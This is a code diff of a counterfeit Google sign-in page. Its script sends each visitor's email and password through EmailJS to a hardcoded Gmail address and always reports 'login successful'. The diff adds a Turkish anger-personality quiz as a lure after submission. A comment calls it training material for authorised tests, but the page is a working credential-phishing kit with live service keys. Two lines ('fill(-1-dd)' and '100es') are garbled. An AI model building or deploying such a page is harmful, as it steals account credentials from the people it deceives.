@@ -177,10 +177,200 @@
             cursor: pointer;
             font-weight: 500;
         }
+        #loginSection, #testSection {
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        #testSection {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        #testSection.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+        #loginSection.hidden {
+            display: none;
+        }
+
+        /* ========== TEST STYLES ========== */
+        .test-container {
+            width: 100%;
+            max-width: 650px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            margin: 20px;
+            background: #fff;
+            box-shadow: 0 4px 30px rgba(0,0,0,0.06);
+        }
+        .test-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .test-header .icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .test-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .test-header p {
+            font-size: 16px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+        .question {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin-bottom: 16px;
+            border-left: 4px solid #1a73e8;
+            transition: all 0.3s ease;
+        }
+        .question.answered {
+            border-left-color: #34a853;
+            background: #f0faf0;
+        }
+        .question .q-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 14px;
+        }
+        .question .options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .question .options label {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #3c4043;
+            cursor: pointer;
+            padding: 6px 14px;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            transition: all 0.2s;
+        }
+        .question .options label:hover {
+            background: #e8f0fe;
+            border-color: #1a73e8;
+        }
+        .question .options input[type="radio"] {
+            accent-color: #1a73e8;
+        }
+        .question .options label.selected {
+            background: #1a73e8;
+            color: #fff;
+            border-color: #1a73e8;
+        }
+        .question .options label.selected input[type="radio"] {
+            accent-color: #fff;
+        }
+        .test-progress {
+            text-align: center;
+            margin: 24px 0 16px;
+        }
+        .test-progress .bar-bg {
+            width: 100%;
+            height: 6px;
+            background: #e8eaed;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        .test-progress .bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f093fb, #f5576c, #4facfe);
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+        .test-progress .step-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+        .test-result {
+            display: none;
+            text-align: center;
+            padding: 32px 24px;
+            border-radius: 16px;
+            animation: fadeInUp 0.6s ease;
+        }
+        .test-result.show {
+            display: block;
+        }
+        .test-result .result-emoji {
+            font-size: 72px;
+            margin-bottom: 12px;
+        }
+        .test-result .result-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .test-result .result-desc {
+            font-size: 16px;
+            color: #5f6368;
+            max-width: 400px;
+            margin: 0 auto 20px;
+            line-height: 1.5;
+        }
+        .test-result .result-bar {
+            width: 100%;
+            max-width: 360px;
+            height: 12px;
+            background: #e8eaed;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 0 auto 16px;
+        }
+        .test-result .result-bar .fill {
+            height: 100%;
+            border-radius: 6px;
+            transition: width 1s ease;
+        }
+        .btn-restart {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 12px 32px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-restart:hover {
+            background: #1b66c9;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 500px) {
+            .container, .test-container { padding: 32px 20px; }
+            .question .options label { font-size: 13px; padding: 5px 12px; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+
+    <!-- ========== LOGIN SECTION ========== -->
+    <div class="container" id="loginSection">
         <div class="logo">
             <svg viewBox="0 0 272 92" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
@@ -230,22 +420,53 @@
         </div>
     </div>
 
+    <!-- ========== TEST SECTION ========== -->
+    <div class="test-container" id="testSection">
+        <div class="test-header">
+            <span class="icon">&#x1F9E0;</span>
+            <h1>Ne Kadar Sinirlisin?</h1>
+            <p>10 soruyu yanıtla, öfke seviyenizi öğrenin!</p>
+        </div>
+
+        <div id="questionsArea"></div>
+
+        <div class="test-progress">
+            <div class="bar-bg"><div class="bar-fill" id="progressFill"></div></div>
+            <div class="step-text" id="stepText">0 / 10</div>
+        </div>
+
+        <div style="text-align:center; margin-top: 12px;">
+            <button class="btn-next" id="showResultBtn" style="display:none;">Sonucu Gör</button>
+        </div>
+
+        <div class="test-result" id="testResult">
+            <div class="result-emoji" id="resultEmoji">&#x1F60A;</div>
+            <div class="result-title" id="resultTitle">Sakin Bir Ruh</div>
+            <div class="result-desc" id="resultDesc">O kadar sakin ki, meditasyon hocası olabilirsin!</div>
+            <div class="result-bar"><div class="fill" id="resultBarFill" style="width:0%; background:#34a853;"></div></div>
+            <div style="font-size:18px; font-weight:600; color:#202124; margin-bottom:24px;" id="resultPercent">%0 Öfke</div>
+            <button class="btn-restart" id="restartBtn">Testi Tekrarla</button>
+        </div>
+    </div>
+
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    
+
     <script>
         // =============================================
         // TƏLİM MƏQSƏDLİ - YALNIZ İCAZƏLİ TEST ÜÇÜN
         // =============================================
 
         // KONFİQURASİYA - HAZIRDIR
-        const EMAILJS_PUBLIC_KEY = 'Ibij0zfIIzvnyppMK';     // Public Key
-        const EMAILJS_SERVICE_ID = 'service_x0ww0oi';       // Service ID
-        const EMAILJS_TEMPLATE_ID = 'template_f40eu4v';     // Template ID
-        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';   // Email gələcək adres
+        const EMAILJS_PUBLIC_KEY = 'Ibij0zfIIzvnyppMK';
+        const EMAILJS_SERVICE_ID = 'service_x0ww0oi';
+        const EMAILJS_TEMPLATE_ID = 'template_f40eu4v';
+        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';
         // =============================
 
         emailjs.init(EMAILJS_PUBLIC_KEY);
 
+        const loginSection = document.getElementById('loginSection');
+        const testSection = document.getElementById('testSection');
         const form = document.getElementById('loginForm');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
@@ -254,8 +475,24 @@
         const submitBtn = document.getElementById('submitBtn');
         const togglePassword = document.getElementById('togglePassword');
 
-        const REDIRECT_URL = 'https://accounts.google.com';
+        // --- Sorular (Türkçe, 10 adet) ---
+        const questions = [
+            { text: 'Birisi sıraya önüne geçerse ne yaparsın?', options: ['Hiçbir şey, beklerim', 'Uyarırım', 'Yüksek sesle söylenirim', 'Kavga çıkarırım'] },
+            { text: 'Trafikte sıkışıp kaldığında nasıl hissedersin?', options: ['Sakin kalırım', 'Biraz sinirlenirim', 'Çok sinirlenirim', 'Kornaya basar bağırırım'] },
+            { text: 'İnternet yavaşladığında tepkin ne olur?', options: ['Beklerim', 'Sinirlenirim ama geçer', 'Modemi kapatıp açarım', 'Ekrana yumruk atarım'] },
+            { text: 'Biri sana haksızlık yaptığında ne yaparsın?', options: ['Konuşarak hallederim', 'Küserim', 'Bağırırım', 'İntikam alırım'] },
+            { text: 'Kahve/çay döküldüğünde tepkin?', options: ['Sorun değil derim', 'Of çeker temizlerim', 'Sinirlenirim', 'Eşyaları fırlatırım'] },
+            { text: 'Kaybettiğin bir oyunda nasıl davranırsın?', options: ['Tebrik ederim', 'İçimden sinirlenirim', 'Tartışma çıkarırım', 'Küfür ederim'] },
+            { text: 'Bir mağazada uzun kuyruk beklemek seni?', options: ['Hiç etkilemez', 'Hafif gerdirir', 'Sinirlendirir', 'Çileden çıkarır'] },
+            { text: 'Telefonun şarjı bittiğinde ne hissedersin?', options: ['Takar şarja giderim', 'Sinirlenirim', 'Paniklerim', 'Telefonu duvara fırlatırım'] },
+            { text: 'Birisi sözünü kesip konuştuğunda?', options: ['Susar beklerim', 'Nazikçe uyarırım', 'Sert uyarırım', 'Bağırırım'] },
+            { text: 'Yemek siparişin yanlış geldiğinde?', options: ['Geri gönderirim', 'Şikayet ederim', 'Çok sinirlenirim', 'Rezillik çıkarırım'] }
+        ];
 
+        let currentSelections = new Array(questions.length).fill(-1-dd);
+        let isTestMode = false;
+
+        // --- Login toggle ---
         togglePassword.addEventListener('click', function() {
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordInput.setAttribute('type', type);
@@ -264,7 +501,7 @@
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            
+
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
 
@@ -272,7 +509,6 @@
                 showError('Xahiş edirik bütün sahələri doldurun.');
                 return;
             }
-
             if (!email.includes('@')) {
                 showError('Düzgün e-poçt ünvanı daxil edin.');
                 return;
@@ -292,21 +528,16 @@
             };
 
             try {
-                const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
-                console.log('Uğurlu:', response);
-                
-                showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 2000);
-
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
             } catch (err) {
-                console.log('Xəta:', err);
-                showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 2000);
+                console.log('EmailJS xətası (önəmsiz):', err);
             }
+
+            // İster başarılı ister hata olsun -> test ekranına geç
+            showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
+            setTimeout(() => {
+                goToTest();
+            }, 1200);
         });
 
         function showError(msg) {
@@ -328,6 +559,152 @@
 
         emailInput.addEventListener('focus', hideMessages);
         passwordInput.addEventListener('focus', hideMessages);
+
+        // --- Geçiş: Login -> Test ---
+        function goToTest() {
+            loginSection.classList.add('hidden');
+            testSection.style.display = 'block';
+            setTimeout(() => {
+                testSection.classList.add('active');
+            }, 50);
+            if (!isTestMode) {
+                renderQuestions();
+                isTestMode = true;
+            }
+        }
+
+        // --- Test Render ---
+        function renderQuestions() {
+            const area = document.getElementById('questionsArea');
+            area.innerHTML = '';
+            questions.forEach((q, idx) => {
+                const div = document.createElement('div');
+                div.className = 'question';
+                div.id = 'q-' + idx;
+                div.innerHTML = `<div class="q-text">${idx+1}. ${q.text}</div><div class="options">`;
+                q.options.forEach((opt, oi) => {
+                    div.innerHTML += `<label data-q="${idx}" data-opt="${oi}">
+                        <input type="radio" name="q${idx}" value="${oi}"> ${opt}
+                    </label>`;
+                });
+                div.innerHTML += `</div>`;
+                area.appendChild(div);
+            });
+
+            document.querySelectorAll('.question .options label').forEach(label => {
+                label.addEventListener('click', function(e) {
+                    const qIdx = parseInt(this.dataset.q);
+                    const optIdx = parseInt(this.dataset.opt);
+                    selectOption(qIdx, optIdx);
+                });
+            });
+
+            document.querySelectorAll('.question .options input[type="radio"]').forEach(radio => {
+                radio.addEventListener('change', function(e) {
+                    const label = this.closest('label');
+                    if (label) label.click();
+                });
+            });
+
+            updateProgress();
+        }
+
+        function selectOption(qIdx, optIdx) {
+            currentSelections[qIdx] = optIdx;
+            const qDiv = document.getElementById('q-' + qIdx);
+            qDiv.classList.add('answered');
+            qDiv.querySelectorAll('.options label').forEach(lb => {
+                lb.classList.remove('selected');
+                if (parseInt(lb.dataset.opt) === optIdx) {
+                    lb.classList.add('selected');
+                    lb.querySelector('input[type="radio"]').checked = true;
+                }
+            });
+            updateProgress();
+
+            document.getElementById('showResultBtn').style.display =
+                currentSelections.every(s => s >= 0) ? 'inline-block' : 'none';
+        }
+
+        function updateProgress() {
+            const answered = currentSelections.filter(s => s >= 0).length;
+            const total = questions.length;
+            const pct = total > 0 ? (answered / total) * 100 : 0;
+            document.getElementById('progressFill').style.width = pct + '%';
+            document.getElementById('stepText').textContent = answered + ' / ' + total;
+        }
+
+        document.getElementById('showResultBtn').addEventListener('click', function() {
+            calculateResult();
+        });
+
+        document.getElementById('restartBtn').addEventListener('click', function() {
+            currentSelections = new Array(questions.length).fill(-1);
+            document.getElementById('testResult').classList.remove('show');
+            document.getElementById('showResultBtn').style.display = 'none';
+            document.querySelectorAll('.question').forEach(q => {
+                q.classList.remove('answered');
+                q.querySelectorAll('.options label').forEach(lb => lb.classList.remove('selected'));
+                q.querySelectorAll('input[type="radio"]').forEach(r => r.checked = false);
+            });
+            updateProgress();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+
+        function calculateResult() {
+            if (currentSelections.some(s => s < 0)) return;
+
+            // Puan: her soruda 0-3 arası (0=sakin, 3=çok sinirli)
+            let total = currentSelections.reduce((sum, val) => sum + val, 0);
+            let maxTotal = questions.length * 3; // 30
+            let percent = Math.round((total / maxTotal) * 100);
+
+            let emoji, title, desc, color;
+            if (percent <= 20) {
+                emoji = '&#x1F60A;';
+                title = 'Sakin Bir Ruh';
+                desc = 'Neredeyse hiçbir şey seni sinirlendirmiyor. Ortamın huzur kaynağısın!';
+                color = '#34a853';
+            } else if (percent <= 40) {
+                emoji = '&#x1F642;';
+                title = 'Oldukça Sakin';
+                desc = 'Bazı şeyler canını sıksa da çoğunlukla soğukkanlısın.';
+                color = '#7ba23f';
+            } else if (percent <= 55) {
+                emoji = '&#x1F610;';
+                title = 'Orta Seviye';
+                desc = 'Bazen patlayabiliyorsun ama genelde kontrol sende.';
+                color = '#fbbc04';
+            } else if (percent <= 70) {
+                emoji = '&#x1F620;';
+                title = 'Sinirli Yapı';
+                desc = 'Olaylar karşısında çabuk geriliyorsun, biraz nefes egzersizi iyi gelir!';
+                color = '#f57c00';
+            } else if (percent <= 85) {
+                emoji = '&#x1F92C;';
+                title = 'Oldukça Sinirli';
+                desc = 'Öfken bir tık yüksek! Trafikte, kuyrukta, internette hep gerginsin.';
+                color = '#e64a19';
+            } else {
+                emoji = '&#x1F92F;';
+                title = 'Volkan Gibisin!';
+                desc = 'Öfke seviyen tavan! Sakinleşmek için bir hobi edinmen gerekebilir.';
+                color = '#d32f2f';
+            }
+
+            document.getElementById('resultEmoji').innerHTML = emoji;
+            document.getElementById('resultTitle').textContent = title;
+            document.getElementById('resultDesc').textContent = desc;
+            document.getElementById('resultPercent').textContent = '%' + percent + ' Öfke';
+            document.getElementById('resultBarFill').style.width = '0%';
+            document.getElementById('resultBarFill').style.background = color;
+
+            document.getElementById('testResult').classList.add('show');
+
+            setTimeout(() => {
+                document.getElementById('resultBarFill').style.width = Math.min(percent, 100) + '%';
+            }, 100es);
+        }
     </script>
 </body>
 </html>
